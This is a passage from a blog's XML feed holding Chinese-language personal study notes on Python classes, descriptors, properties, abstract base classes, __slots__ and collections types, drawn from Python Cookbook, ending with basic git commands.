<li>查找<code>obj.__class__.__dict__</code>，如果attr存在并且是一个描述器，调用attr的<code>__set__</code>方法，如果不存在，继续到<code>obj.__class__</code>父类和祖先类中查找，找到描述器调用器<code>__set__</code>方法。</li>
<li>直接在<code>obj.__dict__</code>中加入<code>obj.__dict__[&#39;attr&#39;] = value</code></li>
</ul>
<h1 id="创建新的类或实例属性"><a href="#创建新的类或实例属性" class="headerlink" title="创建新的类或实例属性"></a>创建新的类或实例属性</h1><p>创建新的拥有额外功能的实例属性类型，通过描述器类来定义它的功能，下面加上了一个类型检查。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">class Integer:</div><div class="line">    def __init__(self, name):</div><div class="line">        self.name = name</div><div class="line">    def __get__(self, instance, cls):</div><div class="line">        # 用类访问,instance为None</div><div class="line">        if instance is None:</div><div class="line">            return self</div><div class="line">        else:</div><div class="line">            return instance.__dict__[self.name]</div><div class="line">    def __set__(self, instance, value):</div><div class="line">        if not isinstance(value, int):</div><div class="line">            raise TypeError(&apos;Expected an int&apos;)</div><div class="line">        instance.__dict__[self.name] = value</div><div class="line">    def __delete__(self, instance):</div><div class="line">        del instance.__dict__[self.name]</div></pre></td></tr></table></figure>
<p>为了使用描述器，必须把描述器的实例作为类属性放到类的定义中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">class Point:</div><div class="line">    x = Integer(&apos;x&apos;)</div><div class="line">    y = Integer(&apos;y&apos;)</div><div class="line">    def __init__(self, x, y):</div><div class="line">        self.x = x</div><div class="line">        self.y = y</div></pre></td></tr></table></figure>
<p>使用描述器，可以在底层捕获核心的实例操作，并且完全自定义行为，它只能在类级别被定义，而不能为每个实例单独定义。</p>
<p>另外如果描述器被当作一个类变量来访问，instance参数就为None，这种情况下，标准做法就是简单的返回这个描述器本身即可。如果是实例变量来访问，那么instance就是对应的实例。</p>
<p>如果只是想简单的自定义某个类的单个属性访问的话就不太需要描述器了，使用property技术会更容易。当程序中有很多重复代码的时候使用描述器，比如上面的多个属性都要用到Integer。</p>
<h1 id="使用延迟计算属性"><a href="#使用延迟计算属性" class="headerlink" title="使用延迟计算属性"></a>使用延迟计算属性</h1><p>这个看起来相当有用，将一个只读属性定义成一个property，并且只在访问的时候才会计算结构，并且访问后，结果值被缓存起来，不用每次都去计算，使用描述器类。这个就可以加入到全量或者增量的计算脚本中，不需要重复计算收益或者资产。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">class lazyproperty:</div><div class="line">    def __init__(self, func):</div><div class="line">        self.func = func</div><div class="line">    def __get__(self, instance, cls):</div><div class="line">        if instance is None:</div><div class="line">            return self</div><div class="line">        else:</div><div class="line">            value = self.func(instance)</div><div class="line">            # 设置属性后，就会直接访问属性，因为这个是一个non-data的描述器，访问顺序在上一节有所描述</div><div class="line">            setattr(instance, self.func.__name__, value)</div><div class="line">            return value</div><div class="line">class Circle:</div><div class="line">    def __init__(self, radius):</div><div class="line">        self.radius = radius</div><div class="line">    # 这里也算是在类中定义的，所以可以访问并且触发描述器</div><div class="line">    @lazyproperty</div><div class="line">    def area(self):</div><div class="line">        print(&apos;Computing area&apos;)</div><div class="line">        return math.pi * self.radius ** 2</div><div class="line">    @lazyproperty</div><div class="line">    def perimeter(self):</div><div class="line">        print(&apos;Computing perimeter&apos;)</div><div class="line">        return 2 * math.pi * self.radius</div></pre></td></tr></table></figure>
<p>看来的学习下元类的相关知识了。。lazyproperty使用<code>__get__()</code>方法在实例中存储计算出来的值，这个实例使用相同的名字作为它的property，所以结果值被存储在实例字典中并且以后就不需要再去计算这个property了。</p>
<p>另外一种实现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">def lazyproperty(func):</div><div class="line">    name = &apos;_lazy_&apos; + func.__name__</div><div class="line">    @property</div><div class="line">    def lazy(self):</div><div class="line">        if hasattr(self, name):</div><div class="line">            return getattr(self, name)</div><div class="line">        else:</div><div class="line">            value = func(self)</div><div class="line">            setattr(self, name, value)</div><div class="line">            return value</div><div class="line">    return lazy</div></pre></td></tr></table></figure>
<h1 id="简单数据结构的初始化"><a href="#简单数据结构的初始化" class="headerlink" title="简单数据结构的初始化"></a>简单数据结构的初始化</h1><p>有很多用作数据结构的类，减少<code>__init__()</code>函数的个数。对啊，可以考虑将部分多层次的数据结构分解为单个的类，这样是不是容易维护？</p>
<p>可以在一个基类中写一个公用的<code>__init__()</code>函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">class Structure1:</div><div class="line">    _fields = []</div><div class="line">    def __init__(self, *args, **kwargs):</div><div class="line">        if len(args) &gt; len(self._fields):</div><div class="line">            raise TypeError(&apos;Expected &#123;&#125; arguments&apos;.format(len(self._fields)))</div><div class="line">        for name, value in zip(self._fields, args):</div><div class="line">            setattr(self, name, value)</div><div class="line">        for name in self._fields[len(args):]:</div><div class="line">            setattr(self, name, kwargs.pop(name))</div><div class="line">        # 未知的关键字</div><div class="line">        if kwargs:</div><div class="line">            raise TypeError(&apos;Invalid arguments: &#123;&#125;&apos;.format(&apos;,&apos;.join(kwargs)))</div><div class="line">class Stock(Structure1):</div><div class="line">    _fields = [&apos;name&apos;, &apos;shares&apos;, &apos;price&apos;]</div></pre></td></tr></table></figure>
<h1 id="定义接口或者抽象基类"><a href="#定义接口或者抽象基类" class="headerlink" title="定义接口或者抽象基类"></a>定义接口或者抽象基类</h1><p>定义一个接口或者抽象类，通过执行类型检查来确保子类实现了某些特定方法。</p>
<p>使用abc模块定义抽象基类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from abc import ABCMeta, abstractmethod</div><div class="line">class IStream(metaclass=ABCMeta):</div><div class="line">    @abstractmethod</div><div class="line">    def read(self, maxbytes=-1):</div><div class="line">        pass</div><div class="line">    @abstractmethod</div><div class="line">    def write(self, data):</div><div class="line">        pass</div></pre></td></tr></table></figure>
<p>抽象类不能被实例化，目的是为了让别的类继承并且实现特定的抽象方法，一个主要用途是在代码中检查某些类是否为特定类型，实现了特定接口。</p>
<p>除了继承，还可以通过注册的方式来让某个类实现抽象基类。<code>IStream.register(io.IOBase)</code></p>
<p><code>@abstractmethod</code>还能注解静态方法，类方法和properties，只需要将注解紧靠在函数定义前即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">@property</div><div class="line">@abstractmethod</div><div class="line">def name(self):</div><div class="line">    pass</div></pre></td></tr></table></figure>
<h1 id="实现数据模型的类型约束"><a href="#实现数据模型的类型约束" class="headerlink" title="实现数据模型的类型约束"></a>实现数据模型的类型约束</h1><p>需要对某些实例属性赋值时候进行检查，自定义属性赋值函数，最好使用描述器。</p>
<p>下面使用描述器实现了一个系统类型和赋值验证框架：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">class Descriptor:</div><div class="line">    def __init__(self, name=None, **opts):</div><div class="line">        self.name = name</div><div class="line">        for key, value in opts.items():</div><div class="line">            # 赋值给实例属性</div><div class="line">            setattr(self, key, value)</div><div class="line">    def __set__(self, instance, value):</div><div class="line">        instance.__dict__[self.name] = value</div><div class="line">class Typed(Descriptor):</div><div class="line">    expected_type = type(None)</div><div class="line">    def __set__(self, instance, value):</div><div class="line">        # 这里用的是实例属性，描述器是在一个类中使用，所以这个属性是另外一个类的实例属性</div><div class="line">        if not isinstance(value, self.expected_type):</div><div class="line">            raise TypeError(&apos;expected &apos; + str(self.expected_type))</div><div class="line">        super().__set__(instance, value)</div><div class="line">class Unsigned(Descriptor):</div><div class="line">    def __set__(self, instance, value):</div><div class="line">        if value &lt; 0:</div><div class="line">            raise ValueError(&apos;Excepted &gt;= 0&apos;)</div><div class="line">        super().__set__(instance, value)</div><div class="line">class MaxSized(Descriptor):</div><div class="line">    def __init__(self, name=None, **opts):</div><div class="line">        if &apos;size&apos; not in opts:</div><div class="line">            raise TypeError(&apos;missing size option&apos;)</div><div class="line">        # 这里继承基类，已经设置了self.size</div><div class="line">        super().__init__(name, **opts)</div><div class="line">    def __set__(self, instance, value):</div><div class="line">        if len(value) &gt;= self.size:</div><div class="line">            raise ValueError(&apos;size must be &lt; &apos; + str(self.size))</div><div class="line">        super().__set__(instance, value)</div></pre></td></tr></table></figure>
<p>自己定义各种不同的数据类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">class Integer(Typed):</div><div class="line">    expected_type = int</div><div class="line">class UnsignedInteger(Integer, Unsigned):</div><div class="line">    pass</div><div class="line">class Float(Typed):</div><div class="line">    expected_type = float</div><div class="line">class UnsignedFloat(Float, Unsigned):</div><div class="line">    pass</div><div class="line">class String(Typed):</div><div class="line">    expected_type = str</div><div class="line">class SizedString(String, MaxSized):</div><div class="line">    pass</div></pre></td></tr></table></figure>
<p>使用这些自定义数据类型：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">class Stock:</div><div class="line">    name = SizedString(&apos;name&apos;, size=8)</div><div class="line">    shares = UnsignedInteger(&apos;shares&apos;)</div><div class="line">    price = UnsignedFloat(&apos;price&apos;)</div><div class="line">    def __init__(self, name, shares, price):</div><div class="line">        self.name = name</div><div class="line">        self.shares = shares</div><div class="line">        self.price = price</div></pre></td></tr></table></figure>
<p>混入类的使用这块需要学习一下。。。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Python-set-和-get-等解释&quot;&gt;&lt;a href=&quot;#Python-set-和-get-等解释&quot; class=&quot;headerlink&quot; title=&quot;Python __set__和__get__等解释&quot;&gt;&lt;/a&gt;Python &lt;code&gt;__set__&lt;
    
    </summary>
    
      <category term="Python" scheme="http://microndgt.github.io/categories/Python/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python" scheme="http://microndgt.github.io/tags/Python/"/>
    
      <category term="Python_Cookbook" scheme="http://microndgt.github.io/tags/Python-Cookbook/"/>
    
  </entry>
  
  <entry>
    <title>Python类与对象</title>
    <link href="http://microndgt.github.io/2017/01/28/Python%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1/"/>
    <id>http://microndgt.github.io/2017/01/28/Python类和对象/</id>
    <published>2017-01-28T09:01:05.000Z</published>
    <updated>2017-02-01T04:28:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>与类定义有关的常见编程模型，包括让对象支持常见的Python特性，特殊方法的使用，类封装技术，继承，内存管理以及有用的设计模式。</p>
<h1 id="改变对象的字符串显示"><a href="#改变对象的字符串显示" class="headerlink" title="改变对象的字符串显示"></a>改变对象的字符串显示</h1><p>要改变一个实例的字符串表示，可以重新定义它的<code>__str__()</code>和<code>__repr__()</code>方法，今天彻底解决这两个的混乱，repr用于返回一个实例的代码表示形式，用于调试，交互式解释器显示的值是一样的。而str会将实例转换成一个字符串，使用<code>str()</code>或者<code>print()</code>函数会输出这个字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">class Pair:</div><div class="line">    def __init__(self, x, y):</div><div class="line">        self.x = x</div><div class="line">        self.y = y</div><div class="line">    # &#123;!r&#125;和&#123;!s&#125;取得%r和%s的效果，也就是输出这个属性的时候也用%r或者%s</div><div class="line">    def __repr__(self):</div><div class="line">        return &apos;Pair(&#123;0.x!r&#125;, &#123;0.y!r&#125;)&apos;.format(self)</div><div class="line">    def __str__(self):</div><div class="line">        return &apos;(&#123;0.x!s&#125;, &#123;0.y!s&#125;)&apos;.format(self)</div></pre></td></tr></table></figure>
<p>很有道理呀，自定义<code>__repr__()</code>和<code>__str__()</code>这样就可以分别在调试的时候和正式运行的时候有所差异</p>
<h1 id="自定义字符串的格式化"><a href="#自定义字符串的格式化" class="headerlink" title="自定义字符串的格式化"></a>自定义字符串的格式化</h1><p>format()函数和字符串方法使得一个对象能够支持自定义的格式化。需要在类上面定义<code>__format__()</code>方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">_formats = &#123;</div><div class="line">  &apos;ymd&apos; : &apos;&#123;d.year&#125;-&#123;d.month&#125;-&#123;d.day&#125;&apos;,</div><div class="line">&#125;</div><div class="line">class Date:</div><div class="line">    def __init__(self, year, month, day):</div><div class="line">        self.year = year</div><div class="line">        self.month = month</div><div class="line">        self.day = day</div><div class="line">    def __format__(self, code):</div><div class="line">        if code == &quot;&quot;:</div><div class="line">            code = &apos;ymd&apos;</div><div class="line">        fmt = _formats[code]</div><div class="line">        return fmt.format(d=self)</div><div class="line">d = Date(2012, 12, 21)</div><div class="line">format(d)</div><div class="line">format(d, &apos;ymd&apos;)</div></pre></td></tr></table></figure>
<p>就和之前自己写date的解析函数一样，自定义字符串格式功能。<code>__format__()</code>方法给Python的字符串格式化功能提供一个钩子。</p>
<h1 id="让对象支持上下文管理协议"><a href="#让对象支持上下文管理协议" class="headerlink" title="让对象支持上下文管理协议"></a>让对象支持上下文管理协议</h1><p>需要实现<code>__enter__()</code>和<code>__exit__()</code>方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">from socket import socket, AF_INET, SOCK_STREAM</div><div class="line">class LazyConnection:</div><div class="line">    def __init__(self, address, family=AF_INET, type=SOCK_STREAM):</div><div class="line">        self.address = address</div><div class="line">        self.family = family</div><div class="line">        self.type = type</div><div class="line">        self.sock = None</div><div class="line">    def __enter__(self):</div><div class="line">        if self.sock is not None:</div><div class="line">            raise RuntimeError(&apos;Already connected&apos;)</div><div class="line">        self.sock = socket(self.family, self.type)</div><div class="line">        self.sock.connect(self.address)</div><div class="line">        return self.sock</div><div class="line">    def __exit__(self, exc_ty, exc_val, tb):</div><div class="line">        self.sock.close()</div><div class="line">        self.sock = None</div><div class="line"># 看到类的书写方法，当然是很熟悉，要融化于心;-)</div></pre></td></tr></table></figure>
<p><code>__enter__()</code>方法的返回值为赋值给as生命的变量，<code>__exit__()</code>方法进行清理工作</p>
<h1 id="创建大量对象时节省内存的方法"><a href="#创建大量对象时节省内存的方法" class="headerlink" title="创建大量对象时节省内存的方法"></a>创建大量对象时节省内存的方法</h1><p>对于主要是用来当成简单数据结构的类来说，可以通过给类添加<code>__slots__</code>属性来极大减少实例所占的内存</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">class Date:</div><div class="line">    __slots__ = [&apos;year&apos;, &apos;month&apos;, &apos;day&apos;]</div><div class="line">    def __init__(self, year, month, day):</div><div class="line">        self.year = year</div><div class="line">        self.month = month</div><div class="line">        self.day = day</div></pre></td></tr></table></figure>
<p>定义<code>__slots__</code>后，实例就会通过很小的固定大小的数组创建，但是有一个缺点就是只能用在<code>__slots__</code>定义的属性名，不能给实例添加新的属性了。使用slots后节省的内存会跟存储属性的数量和类型有关。不过使用它最好只在真的需要的地方作为内存优化工具。</p>
<h1 id="在类中封装属性名"><a href="#在类中封装属性名" class="headerlink" title="在类中封装属性名"></a>在类中封装属性名</h1><p><code>_internal</code>单个下划线开头的名字应该是内部实现，同样适用于模块名和模块级别的函数，<code>__private</code>双下划线开头的名字是私有属性或者私有方法，这种属性或者方法是无法通过继承被覆盖的。</p>
<p>应该让非公共名称以单下划线开始，如果代码涉及子类，并且有些内部属性应该在子类中隐藏，那么使用双下划线方案。</p>
<p>如果定义的变量和某个保留关键字冲突，后面加上单下划线，<code>lambda_</code></p>
<h1 id="创建可管理的属性"><a href="#创建可管理的属性" class="headerlink" title="创建可管理的属性"></a>创建可管理的属性</h1><p>对于重复代码，可以使用装饰器和闭包啊，我现在觉得capacity包的代码又可以优化了。</p>
<p>给某个实例属性增加除了访问和修改之外的其他逻辑，比如类型检查或者合法性验证。自定义属性的简单方法是将它定义为一个property。</p>
<p>下面的这种定义方式值得学习：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">class Person:</div><div class="line">    def __init__(self, first_name):</div><div class="line">        # 初始化的时候也进行类型检查，first_name是一个属性</div><div class="line">        self.first_name = first_name</div><div class="line">    @property</div><div class="line">    def first_name(self):</div><div class="line">        return self._first_name</div><div class="line">    @first_name.setter</div><div class="line">    def first_name(self, value):</div><div class="line">        if not isinstance(value, str):</div><div class="line">            raise TypeError(&apos;Expected a string&apos;)</div><div class="line">        self._first_name = value</div><div class="line">    @first_name.deleter</div><div class="line">    def first_name(self):</div><div class="line">        raise AttributeError(&quot;can not delete attribute&quot;)</div></pre></td></tr></table></figure>
<p>只有在first_name属性被创建后，后面的两个装饰器才能被定义。另外在初始化的时候也进行类型检查，通过设置<code>self.first_name</code>，自动调用setter方法。</p>
<p>不要写没有做任何其他额外操作的property，而且property还是一种定义动态计算attribute的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">import math</div><div class="line">class Circle:</div><div class="line">    def __init__(self, radius):</div><div class="line">        self.radius = radius</div><div class="line">    @property</div><div class="line">    def area(self):</div><div class="line">        return math.pi * self.radius ** 2</div><div class="line">c = Circle(4.0)</div><div class="line">c.radius</div><div class="line">c.area</div></pre></td></tr></table></figure>
<h1 id="调用父类方法"><a href="#调用父类方法" class="headerlink" title="调用父类方法"></a>调用父类方法</h1><p>调用父类的一个方法，可以使用super()函数，super()函数的一个常见用法是在<code>__init__()</code>方法中确保父类被正确的初始化了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">class A:</div><div class="line">    def __init__(self):</div><div class="line">        self.x = 0</div><div class="line">class B(A):</div><div class="line">    def __init__(self):</div><div class="line">        # 其他的普通方法也是如此使用</div><div class="line">        super().__init__()</div><div class="line">        self.y = 1</div></pre></td></tr></table></figure>
<p>对于定义的每一个类，Python会计算出一个方法解析顺序(MRO)列表，这个列表就是一个简单的所有基类的线性顺序表，为了实现继承，Python会在MRO列表上从左到右开始查找基类，直到找到第一个匹配这个属性的类为止。</p>
<h1 id="子类中扩展property"><a href="#子类中扩展property" class="headerlink" title="子类中扩展property"></a>子类中扩展property</h1><p>扩展定义在父类的property的功能，一个property是getter，setter和deleter方法的集合，而不是单个方法，所以扩展property的时候确定是重新定义所有方法，还是只修改其中一个。</p>
<h2 id="重新定义所有方法"><a href="#重新定义所有方法" class="headerlink" title="重新定义所有方法"></a>重新定义所有方法</h2><p>使用super()来调用父类的实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">class SubPerson(Person):</div><div class="line">    @property</div><div class="line">    def name(self):</div><div class="line">        print(&quot;getting name&quot;)</div><div class="line">        return super().name</div><div class="line">    @name.setter</div><div class="line">    def name(self, value):</div><div class="line">        print(&quot;Setting name to &quot;, value)</div><div class="line">        super(SubPerson, Subperson).name.__set__(self, value)</div><div class="line">    @name.deleter</div><div class="line">    def name(self):</div><div class="line">        print(&quot;Deleting name&quot;)</div><div class="line">        super(SubPerson, SubPerson).name.__delete__(self)</div></pre></td></tr></table></figure>
<p>使用<code>super(SubPerson, SubPerson).name.__delete__(self)</code>原因是将控制权传递给之前定义的name属性的<code>__delete__()</code>方法，但是获取这个方法的唯一途径是使用类变量来访问。</p>
<h2 id="重定义其中一个方法"><a href="#重定义其中一个方法" class="headerlink" title="重定义其中一个方法"></a>重定义其中一个方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">class SubPerson(Person):</div><div class="line">    @Person.getter</div><div class="line">    def name(self):</div><div class="line">        print(&quot;getting name&quot;)</div><div class="line">        return super().name</div></pre></td></tr></table></figure>
<p>如此，property之前已经定义过的方法会被复制过来，而getter函数被替换。</p>
<p>如果不知道到底哪个基类定义了property，只能重新定义所有property并且使用super()来将控制权传递给前面的实现。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;与类定义有关的常见编程模型，包括让对象支持常见的Python特性，特殊方法的使用，类封装技术，继承，内存管理以及有用的设计模式。&lt;/p&gt;
&lt;h1 id=&quot;改变对象的字符串显示&quot;&gt;&lt;a href=&quot;#改变对象的字符串显示&quot; class=&quot;headerlink&quot; title=&quot;
    
    </summary>
    
      <category term="Python" scheme="http://microndgt.github.io/categories/Python/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python" scheme="http://microndgt.github.io/tags/Python/"/>
    
      <category term="Python_Cookbook" scheme="http://microndgt.github.io/tags/Python-Cookbook/"/>
    
  </entry>
  
  <entry>
    <title>Python Guide</title>
    <link href="http://microndgt.github.io/2017/01/27/Python-guide/"/>
    <id>http://microndgt.github.io/2017/01/27/Python-guide/</id>
    <published>2017-01-27T03:18:47.000Z</published>
    <updated>2017-01-28T06:41:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="算法与数据结构"><a href="#算法与数据结构" class="headerlink" title="算法与数据结构"></a>算法与数据结构</h1><p><code>list, tuple, set</code></p>
<h2 id="fronzenset"><a href="#fronzenset" class="headerlink" title="fronzenset"></a>fronzenset</h2><p>元素一经创建，不可增加、删除和修改。</p>
<h2 id="collections-OrderedDict"><a href="#collections-OrderedDict" class="headerlink" title="collections.OrderedDict"></a>collections.OrderedDict</h2><p>记录了内容添加的顺序，以添加顺序为准<code>d1 = collections.OrderedDict()</code></p>
<h2 id="collections-defaultdict"><a href="#collections-defaultdict" class="headerlink" title="collections.defaultdict"></a>collections.defaultdict</h2><p>会自动为它的键赋一个初值，<code>frequencies = defaultdict(int)</code>，所以默认值是int类型的，如果<code>frequencies = defaultdict(list)</code>，键对应的值类型就默认是列表类型的</p>
<h2 id="collections-deque"><a href="#collections-deque" class="headerlink" title="collections.deque"></a>collections.deque</h2><p>高效实现插入和删除操作的双向列表，适合用于列表和栈，对的，是否可以用在项目上经常有<code>insert</code>的列表数据结构上？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from collections import deque</div><div class="line">q = deque([&apos;a&apos;, &apos;b&apos;, &apos;c&apos;])</div><div class="line">q.append(&apos;x&apos;)</div><div class="line">q.appendleft(&apos;y&apos;)</div><div class="line"># 还支持pop()和popleft()</div></pre></td></tr></table></figure>
<h2 id="collections-namedtuple"><a href="#collections-namedtuple" class="headerlink" title="collections.namedtuple"></a>collections.namedtuple</h2><p>创建了一个自定义的tuple对象，并且规定了tuple元素的个数，并且可以用属性而不是索引来表示tuple中的某个元素，这样<code>namedtuple</code>定义的数据类型，具备tuple的不变性，又可以根据属性来引用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">from collections import namedtuple</div><div class="line"># 名称，属性list</div><div class="line">Point = namedtuple(&apos;Point&apos;, [&apos;x&apos;, &apos;y&apos;])</div><div class="line">p = Point(1, 2)</div><div class="line">p.x</div><div class="line">p.y</div></pre></td></tr></table></figure>
<h2 id="collections-Counter"><a href="#collections-Counter" class="headerlink" title="collections.Counter"></a>collections.Counter</h2><p>简单的计数器，比如统计字符出现的个数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from collections import Counter</div><div class="line">a = &quot;programming&quot;</div><div class="line">c = Counter(a)</div><div class="line">c.most_common()</div></pre></td></tr></table></figure>
<blockquote>
<p>去刷leetcode！看看算法导论</p>
</blockquote>
<h1 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h1><p>这块自己应该是最薄弱的地方吧，没有系统的概念，所以多看书，多学习吧。这里有两个资源：</p>
<p><a href="http://fex.baidu.com/blog/2014/05/what-happen/" target="_blank" rel="external">从输入URL 到页面加载完成的过程中都发生了什么事情</a></p>
<p>图解Http</p>
<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><p>有三种类型的数据库，关系型数据库，文档型数据库(mongodb)，内存型数据库(Redis)</p>
<p>有时间去研究一下mongodb，强化学习一下Redis</p>
<h1 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h1><p>这块虽然基本的自己在用，但是好多都没有实践，比如合并请求之类的命令，现在发现好多都需要学习。。。</p>
<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git add . #将什么添加到仓库</div><div class="line">git commit -m &quot;wrote a note&quot; # 将文件提交到仓库</div><div class="line">git status #掌握仓库当前状态</div><div class="line">git diff # 查看做了什么修改</div></pre></td></tr></table></figure>
